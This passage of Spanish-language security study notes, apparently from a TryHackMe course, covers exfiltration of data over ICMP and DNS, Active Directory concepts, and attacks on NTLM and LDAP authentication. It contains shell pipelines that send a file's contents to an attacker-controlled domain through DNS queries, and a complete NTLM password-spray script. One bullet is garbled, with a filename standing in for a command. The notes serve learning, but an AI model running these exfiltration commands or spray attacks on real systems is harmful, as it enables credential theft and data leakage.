Así por ejemplo, supongámos que queresmo enviar las credenciales *thm:tryhackme* con un paquete ICMP, entonces, en primer lugar pasamos el string a formato hexadecimal:

```bash
echo "thm:tryhackme" | xxd -p

# OUTPUT: 74686d3a7472796861636b6d650a
```

Y seguidamente lo envíamos mediante el comando *Ping*:

```bash
ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a
```

Si puediéramos examinar el paquete con una herramienta como Wireshark veríamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930125459.png' | relative_url }}" text-align="center"/>
</div>

<br />

Así pues procedamos a examinar con más detalle la técnica de *ICMP Data Exfiltration*.

Ahora que tenemos los fundamentos básicos del envío manual de datos a través de paquetes ICMP, analicemos cómo usar Metasploit para filtrar datos. El framework Metasploit utiliza la misma técnica explicada en la sección anterior. Sin embargo, capturará los paquetes ICMP entrantes y esperará un valor desencadenante de Beginning of File (BOF). Una vez que se recibe, escribe en el disco hasta que obtiene el valor End Of File (EOF). 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930131041.png' | relative_url }}" text-align="center"/>
</div>

Una herramienta sofisticada que nos permite obtener una reverse shell que establece la comunicación a través del protocolo ICMP es  [ICMPDoor](https://github.com/krabelize/icmpdoor)

La herramienta usa el mismo concepto que discutimos anteriormente en esta tarea, donde un atacante utiliza la sección de datos dentro del paquete ICMP. La única diferencia es que un atacante envía un comando que debe ejecutarse en la máquina de la víctima. Una vez que se ejecuta el comando, una máquina víctima envía la salida de ejecución dentro del paquete ICMP en la sección de Datos.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930132642.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exfiltration over DNS**

El protocolo DNS es un protocolo común y su principal propósito consiste en la resolución de nombres de dominio con sus respectivas direcciones IP o viceversa.

Generalmente, este protocolo se basa en un esquema *request-reply* sobre servidores DNS a los que se les envía una IP o un dominio y devuelven el correspondiente dominio o IP asociados.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001125456.png' | relative_url }}" text-align="center"/>
</div>

Aunque el protocolo DNS no esté explícitamente diseñado para el intercambio de información, existen formas de abusar de su diseño para transferir datos. Como por otra parte DNS no es un protocolo de la capa de transporte, generalmente no está monitorizado y por ello suele ser una preferencia para esta tarea entre los atacantes.

Esencialmente, *el DNS exfiltration consiste en enviar información sensible incrustada en una DNS request sobre un DNS server bajo control del atacante que posteriomente puede acceder a los DNS records para acceder a dichos datos*. Existen sin embargo dos limitaciones a tener en cuenta antes de proceder a explicar la técnica:

- La longitud máxima del Fully Qualified Domain Name (FQDN) son 255 caracteres.
- El subdomain name no puede exceder los 63 caracteres.

Basados en estas limitaciones, podemos emplear un número limitado de caracteres para transferir a través del DNS. Siempre información que no conste de elementos muy pesados, por ejemplo un fichero de 10 MB necesitaría de 50000 DNS request, sería demasiado ruidoso y probablemente llamaría la atención.

Veámos los pasos de la exfiltración de datos a través del DNS:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001125016.png' | relative_url }}" text-align="center"/>
</div>

1. Un atacante registra un nombre de dominio, por ejemplo, *tunnel.com*. 
2. El atacante configura los puntos de registro NS de tunnel.com en un servidor bajo control del propio atacante.
3. El malware o el atacante envía datos confidenciales desde una máquina víctima a un nombre de dominio controlado; por ejemplo, passw0rd.tunnel.com, donde *passw0rd* son los datos que deben transferirse.
4. La solicitud de DNS se envía a través del servidor DNS local y se reenvía a través de Internet.
5. El DNS server autorizado del atacante (servidor malicioso) recibe la solicitud de DNS.
6. Finalmente, el atacante extrae la contraseña del nombre de dominio.

<br />

Un caso útil en el que podemos utilizar la DNS exfiltration es cuando estamos en un contexto en el que un firewall bloquea toda posible comunicación.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001130618.png' | relative_url }}" text-align="center"/>
</div>

<br />

Intentemos ver ahora un caso práctico de exfiltración de datos a través de DNS. En términos muy sencillos, si tuviéramos un fichero con información que quisiéramos recuperar de vuelta deberíamos primero codificar los datos en base64 y adherirlo como un subdominio a un nombre de dominio autorizado y realizar una DNS request sobre un servidor de nuestro control.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001131101.png' | relative_url }}" text-align="center"/>
</div>

Supongámos que tenemos control sobre dos máquinas, una máquina del atacante y una máquina víctima desde la que queremos enviar información.

- El primer paso es configurar la máquina atacante para recibir tráfico de red a través del puerto 53/udp (esto es, un DNSdump):

```bash
sudo tcpdump -i eth0 udp port 53 -v
```

- En segundo lugar, consideramos el fichero credits.txt dentro de una máquina víctima que deseamos enviar:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001132328.png' | relative_url }}" text-align="center"/>
</div>

Siguiendo el esquema anterior debemos en primer lugar pasar el contenido a un formato aceptable para la transmisión como puede ser base64:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001132926.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, cuando contamos los bytes que ocupa el string observamos que son demasiados como para adherirlo como subdominio a un mismo dominio.

Con la finalidad de enviarlo de forma que no llame la atención a través de la red introducimos la siguiente concatenación de comandos sobre el fichero creds.txt:

```bash
cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
```

- *cat* obtiene el contenido del fichero.
- *base64* pasa a formato base64 el contenido del fichero.
- 7.BufferOverflowIntroduction.md elimina los saltos de línea "\\n".
- *fold* agrupa el contenido en conjuntos de 18 caracteres.
- *sed* adhiere a cada grupo el string 'att.tunnel.com'

De forma que el resultado es:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001140356.png' | relative_url }}" text-align="center"/>
</div>

Así, lo único que falta añadir es el comando dig para enviarlo sobre el DNS y luego pasarlo sobre bash para que ejecute el string resultante como un comando:

```bash
cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```

- Tras mandar el comando, los datos se han recibido en el DNS server instaurado en la máquina atacante.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001143204.png' | relative_url }}" text-align="center"/>
</div>

Así, deshacemos las transformaciones sobre los datos y obtenemos la información:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221001143445.png' | relative_url }}" text-align="center"/>
</div>

Ahora que hemos visto cómo podemos enviar información desde un lado de la red al otro sobra decir que pueden producirse comunicaciones de Comand and Control o C2 en un contexto de DNS exfiltrating.

<br />

### 6. Compromising Active Directory.
#### 6.1. Active Directory Basics.

**Windows Domain**

Podemos entender un *Windows Domain* (Dominio de Windows) como una agrupación de un dispositivos que quedan gestionados bajo el mismo elemento administrador denominado como *Domain Controller* (Controlador de Dominios). A este sistema de gestión de dispositivos se le denomina como *Active Directory* cuya eficiencia y sentido aumentan en la medida en la que lo hacen los dispositivos que quedan coordinados bajo dicho servicio.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005080540.png' | relative_url }}" text-align="center"/>
</div>

Las principales ventajas de tener configurado un dominio en Windows son:

- *Identidad Centralizada*: Todos los usuarios de la red pueden ser configurados desde AD con el mínimo esfuerzo.
- *Gestión de políticas de seguridad*: Puedes configurar políticas de seguridad desde AD y aplicarlo sobre usuarios y máquinas a lo largo de la misma red.

<br />

**Active Directory**

El núcleo de cualquier Dominio es el AD DS o *Active Directory Domain Service*. Este servicio actua como un catálogo que guarda información sobre todos los objetos que existen dentr de la red, entre estos objetos podemos encontrar: Usuarios, Grupos, Máquinas, Impresoras, Shares (directorios compartidos). Recordamos que por otra parte en Windows cualquier cosa que sea susceptible de ser manipulada se entiende bajo la arquitectura del [objeto](https://es.wikipedia.org/wiki/Lenguaje_orientado_a_objetos):

- *Users*: Este es uno de los objetos más comunes, además del hecho de que son objetos conocidos como *security principals* en el sentido de que son objetos que pueden actuar sobre otros objetos de la red. Generalmente estos precisan de *autenticación* y se les puede conceder privilegios sobre otros recursos del sistema sobres los cuales actúan.

Las entidades que representan los usuarios se pueden clasificar a su vez en dos tipos:

- *Personas*: Personas dentro de la organización que necesitan acceso a la red para utilizar los recursos del sistema.
- *Services*: Los servicios tienen a su disposición cuentas de usuarios desde la que ejecutan acciones como IIS o MSSQL. Todo servicio requiere de una cuenta de usuario para funcionar correctamente.

- *Machines*: Las máquinas son otro tipo de objeto dentro de Active Directory, estos abstraen el concepto de computadora y también son considerados como *security principals* necesitan de autenticación y pueden a su vez gestionar otros objetos. Los nombres de cuenta de las máquinas consisten en el nombre de la computadora seguido de un dolar, por ejemplo DC01$.

- *Security Groups*: Los grupos son colecciones de usuarios que comparten privilegios o características sobre ciertos objetos. Es un sistema de gestión de privilegios; si se añade un usuario a un grupo inmediatamente heredará los privilegios del propio grupo.

Así, como tales los grupos en Windows también son Security Principals. Algunos de los grupos más importantes son:

| Security Group | Description |
| - | - |
| Domain Admins | Grupo de usuarios que tienen privilegios de administración sobre un dominio entero comprendido el Domain Controller. |
| Server Operators | Administradores del Controlador de Dominios. No pueden cambiar ningún miembro de un grupo administrativo. |
| Backup Operators | Pueden acceder a cualquier fichero, ignorando sus permisos. Se utilizan para generar backups de archivos dentro del dominio. |
| Account Operators | Pueden crear o modificar otras cuentas del dominio. |
| Domain Users | Todos los usuarios del dominio. |
| Domain Computers | Incluye todas las máquinas existentes en el dominio. |
| Domain Controllers | Todos los controladores de dominio del dominio. |

Por otra parte, para gestionar los usuarios y las computadoras de un dominio necesitamos logearnos dentro de CD y acudir a la aplicación que gestiona estos elementos conocida como "Active Directory Users and Computers":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005094519.png' | relative_url }}" text-align="center"/>
</div>

Esto abrirá un esquema jerárquico en el que se puede observar de forma organizada los distintos objetos que integran el dominio. Los objetos a su vez se organizan en *Organizational Units (OUs)* que son contenedores de objetos del mismo tipo.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005095254.png' | relative_url }}" text-align="center"/>
</div>

Si abrimos una de estas OU, observaremos que encontraremos instancias de objetos en ellas:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005095325.png' | relative_url }}" text-align="center"/>
</div>

Algunos OUs existen por defecto:

- *Builtin*: Contiene grupos por defecto disponibles en cualquier host de Windows.
- *Computers*: Cualquier máquina que se una a la red será añadida a este OU.
- *Domain Controllers*: Contiene los Controladores de Dominio que hay en la red.
- *Users*: Usuarios de la red.
- *Managed Service Accounts*: Contiene cuentas asociadas a servicios.

Las OUs sirven para aplicar políticas sobre conjuntos de objetos (configuraciones, etc) mientras que los grupos de seguridad se emplean para gestionar servicios.

<br />

**Managing Users in AD**

Veámos algunas operaciones un administrador puede hacer respecto de los usuarios en el servicio de Active Directory.

- *Delegation*:

La delegación consiste en la acción de conceder control a un usuario sobre ciertos OUs mediante privilegios. Uno de los casos más comúnes en el que esto sucede es en la concesión del privilegio *IT support* para resetear las contraseñas de usuarios con bajos privilegios.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005122114.png' | relative_url }}" text-align="center"/>
</div>

Esto abre una ventana que pregunta por los usuarios o grupos sobre los cuales se quiere hacer la delegación.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005122317.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente se nos indican los privilegios que se van a conceder.

Sin embargo, también es posible que nosotros como usuarios tengamos la capacidad de delegar privilegios en otros usuarios. Pero tofavía podemos realizar la misma operación desde powershell:

```powershell
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```

También podemos imponer un comando para que se resetee la contraseña del usuario en cuestión (Sophie) la próxima vez que se logee:

```powershell
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
```

<br />

**Managing Computers in AD**

Por defecto, todas las máquinas que se unen al dominio (excepto el propio controlador de dominios) se ponen en un conteneder denominado "Computadoras".

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005125525.png' | relative_url }}" text-align="center"/>
</div>

Las computadoras por otra parte se clasifican en al menos tres grupos:

- *Workstation*: Son uno de los dispostivos más comúnes dentro de AD. Es el tipo de dispositivo en el que se logea un usuario.
- *Server*: Los servidores son el tipo de máquina desde el que operan los servicios a través de sus cuentas.
- *Domain Controller*: Se trata del centro neurálgico de un dominio de Active Directory, a través de él se gestionan el resto de objetos que integran el dominio en sí.

<br />

**Group Policies**

Como hemos comentado, la idea principal de las OUs es la de ser capaces de utilizarlas para aplicar políticas concretas, configuraciones, al dominio.

Windows maneja tales políticas a través del *Group Policy Objects* (GPO). Los GPOs son simplemente una collección de configuraciones que pueden ser aplicados a un OU.

Para configurar las GPOs podemos abrir el *Group Policy Management*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005131942.png' | relative_url }}" text-align="center"/>
</div>

Lo primero que veremos cuando abrimos esta aplicación es la jerarquía OUs:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005171055.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que dentro del OU Group Policy Object, la información se divide en diversas pestañas, de entre ellas, la más importante es la pestaña "Settings" que contiene configuración específcia aplicada al GPO:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005171621.png' | relative_url }}" text-align="center"/>
</div>

Podemos ver por ejemplo la política de las contraseñas:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005182822.png' | relative_url }}" text-align="center"/>
</div>

Una alteración de este GPO afecta a todo el dominio y en consecuencia a todas las máquinas. Para cambiar alguna configuración del GPO seleccionamos botón derecho sobre el mismo y Edit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005185501.png' | relative_url }}" text-align="center"/>
</div>

Esto abrirá el Group Policy Management Editor que contiene de forma organizada todas las opciones de configuración del dominio. Podemos por ejemplo echar un vistazo a la política de contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005185725.png' | relative_url }}" text-align="center"/>
</div>

Además, ofrece información extra de cada propiedad o "item" en una pestaña explain:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005190822.png' | relative_url }}" text-align="center"/>
</div>

Los GPO afectan a todo el dominio, otros dispositivos tienen acceso al mismo debido a que estos se almacenan en un Share llamado SYSVOL (C:\\Windows\\SYSVOL\\sysvol) que está almacenado en el Controlador de Dominios. Un cambio en el SYSVOL tarda 2 horas en llegar al resto de ordenadores de un dominio pero podemos emplear el siguiente cmdlet de powershell para forzar el cambio con más rapidez:

```powershell
gpupdate /force
```

<br />

**Authentication Methods**

Cuando utilizamos los dominios de Windows todas las credenciales se guardan en el Controlador de Dominios. Cuando un usuario se intenta autenticar a un servicio empleando unas credenciales de dominio el servicio necesitará ponerse en contacto con el DC para verificar que son correctas.

Dos protocolos son empleados para la autenticación de una red en un dominio Windows:

- *Kerberos Authentication*:

Este es el protocolo de autenticación por defecto en cualquier versión reciente de Windows. A los usuarios que se autentican a través de Kerberos se les asigna un *ticket* el cual es una prueba de una autenticación previa en el sistema.

El proceso en el que esto ocurre consta de los siguientes pasos:

- El usuario manda de forma cifrada su nombre de usuario y un "timestamp", empleando a modo de clave de cifrado un algoritmo derivado de su contraseña, al KDC (Key Distribution Center), un servicio usualmente instalado en el Controlador de Dominios. El KDC devuelve un *Ticket Granting Ticker* (cifrado con un algoritmo basado en las credenciales de la contraseña krbtgt) que permite al usuario recolectar otros tickets para otros servicios específicos sin necesidad de volver a introducir las credenciales

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221005212337.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, cuando el usuario quiere conectarse a un servicio en la red emplea el TGT para pedir al KDC un Ticket Granting Service (TGS) que permiten la conexión a servicios concretos para los que fueron creados. El usuario envía su nombre de usuario y un timestamp cifrados con la clave de sesión junto con el TGT y el Service Principal Name (SPN) que indica el servicio y el servidor al que se quiere acceder.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221006084513.png' | relative_url }}" text-align="center"/>
</div>

De esta forma el TGS se envía al servicio deseado para autenticar y establecer una conexión:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221006084850.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *NetNTLM Authentication*:

El NetNTLM emplea un mecanismo challenge-response, el proceso sucede como sigue:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221006085520.png' | relative_url }}" text-align="center"/>
</div>

1. El cliente envía una solicitud de autenticación al servidor al que desea acceder.
2. El servidor genera un número aleatorio y lo envía como un desafío al cliente.
3. El cliente combina su hash de contraseña NTLM con el desafío (y otros datos conocidos) para generar una respuesta al desafío y lo envía al servidor para su verificación.
4. El servidor reenvía el desafío y la respuesta al controlador de dominio para su verificación.
5. El controlador de dominio usa el desafío para volver a calcular la respuesta y la compara con la respuesta original enviada por el cliente. Si ambos coinciden, el cliente se autentica; de lo contrario, se deniega el acceso. El resultado de la autenticación se devuelve al servidor.
6. El servidor reenvía el resultado de la autenticación al cliente.

<br />

#### 6.2. Breaching Active Directory.

**NTLM Authenticated Services**

NTLM son las siglas de New Technology LAN Manager se trata de un conjunto o suite de protocolos empleados para autenticar identidades de usuarios en Active Directory. El mecanismo de seguridad derivado de NTLM es NetNTLM visto en la sección anterior, el cual regula servicios que están expuestos a la red pública: Outlook Web App, RDP, VPNs, Web Applications.

NetNTLM permite a la aplicación a la que el usuario quiere autenticarse jugar el rol de intermediario entre el usuario y el DC. Esto significa esencialmente que el usuario se autentica en la aplicación y posteriormente, la aplicación se logea por el usaurio en el DC.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221006165631.png' | relative_url }}" text-align="center"/>
</div>

La forma de atacar estos servicios usualmente consiste en realizar un ataque de fuerza bruta / ataque de diccionario o de password spray (es necesario matizar que la diferencia entre ambos consiste en que un ataque de fuerza bruta es el intento de logearse en una cuenta de usuario con una lista de ocntraseñas mientras que el password spray consiste en intentar logearse en una lista de cuentas de usuarios empleando la misma contraseña).

Para el ataque de fuerza bruta podemos emplear Hydra y el siguiente script escrito en Python para password spray:

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
def __init__(self, fqdn):
self.HTTP_AUTH_FAILED_CODE = 401
self.HTTP_AUTH_SUCCEED_CODE = 200
self.verbose = True
self.fqdn = fqdn

def load_users(self, userfile):
self.users = []
lines = open(userfile, 'r').readlines()
for line in lines:
self.users.append(line.replace("\r", "").replace("\n", ""))

def password_spray(self, password, url):
print ("[*] Starting passwords spray attack using the following password: " + password)
count = 0
for user in self.users:
response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
count += 1
continue
if (self.verbose):
if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
print ("[-] Failed login with Username: " + user)
print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
userfile = ''
fqdn = ''
password = ''
attackurl = ''

try:
opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
except getopt.GetoptError:
print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
sys.exit(2)

for opt, arg in opts:
if opt == '-h':
print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
sys.exit()
elif opt in ("-u", "--userfile"):
userfile = str(arg)
elif opt in ("-f", "--fqdn"):
fqdn = str(arg)
elif opt in ("-p", "--password"):
password = str(arg)
elif opt in ("-a", "--attackurl"):
attackurl = str(arg)

if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
#Start attack
sprayer = NTLMSprayer(fqdn)
sprayer.load_users(userfile)
sprayer.password_spray(password, attackurl)
sys.exit()
else:
print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
sys.exit(2)



if __name__ == "__main__":
main(sys.argv[1:])
```

<br />

**LDAP Bind Credentials**

LDAP son las siglas de Lightweight Directory Access Protocol y es un protocolo que interviene en otro mecanismo de autenticación en Active Directory y especialmente popular en aplicaciones de terceros como Gitlab, Jenkins, VPNs, etc. Con LDAP las aplicaciones verifican las credenciales del usuario con lo que el usuario necesita credenciales de AD.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221006190734.png' | relative_url }}" text-align="center"/>
</div>

Si consiguiéramos acceder a un servidor gestionado por LDAP no habríamos que acudir a los ficheros de configuración para extraer estos credenciales AD. Esto se puede realizar realizando un LDAPPass-back attack.

Este se basa en obtener acceso a la configuración de un dispositivo donde se especifican parámetros LDAP para engañar al servidor. Generalmente, las credenciales de estas interfaces de configuración se mantienen por defecto: *admin:admin* o *admin:password*.

No podremos extraer directamente las credenciales LDAP ya que la contraseña suele estar oculta. Sin embargo, podemos alterar la configuración de LDAP, como la IP o el nombre de host del servidor LDAP. En un ataque de LDAP Pass-back, podemos modificar esta IP a nuestra IP y luego probar la configuración de LDAP, *lo que obligará al dispositivo a intentar la autenticación LDAP en nuestro dispositivo no autorizado*. Podemos interceptar este intento de autenticación para recuperar las credenciales LDAP.

<br />

**Microsoft Deployment Toolkit**

El Microsoft Deployment Toolkit (MDT) es un servicio de microsoft que automatiza el despliege del sistemas operativos Microsoft. Grandes organizaciones lo utilizan para desplegar grandes números de nuevas imagenes en sus organizaciones. Concomitantemente, el MDT se suele usar junto con el SCCM (System Center Configuration Manager) que gestiona las actualizaciones de las imágenes desplegadas por el MDT.

<br />
